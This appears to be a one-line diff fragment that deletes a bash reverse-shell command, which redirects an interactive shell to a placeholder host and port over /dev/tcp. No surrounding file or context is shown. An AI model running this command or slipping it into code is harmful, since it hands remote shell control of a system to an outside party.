@@ -1,1 +1,0 @@
-bash -i >& /dev/tcp/[LIP]/[PORT]] 0>&1
